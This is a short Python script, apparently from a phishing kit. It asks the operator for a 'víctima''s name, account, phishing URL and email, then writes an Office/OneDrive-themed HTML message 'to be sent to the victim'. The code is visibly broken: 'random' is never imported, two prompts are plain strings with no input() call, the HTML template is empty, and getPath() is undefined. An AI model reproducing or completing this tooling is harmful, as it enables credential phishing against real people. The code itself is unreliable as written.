import time
import os
import sys

def OneDriveEn():
    #Información de la victima
    userName = input("Introduce el nombre de tu victima-->")
    userAccount = input("Introduce la cuenta de usuario de tu victima-->")
    url=("Introduce el url de phishing-->")
    userEmail=("Introduce el email de la victima-->")
    
    randomCode=random.randint(100000,999999)
    
    date=time.localtime()
    currentDate=time.strftime("%D %B %Y, %H:%M:%S",date)
    
    ##HTML que se enviara a la victima
    officeHtml=("""
                   
                   """.format(currentDate,userEmail,userEmail,userEmail,randomCode,userEmail,userEmail))
    fileNameHtml=userName+"Office.html"
    htmlFile=open("./reportFolder/"+fileNameHtml,"w")
    htmlFile.write(officeHtml)
    htmlFile.close()
    print("HTML creado y preparado para enviar")
    getPath()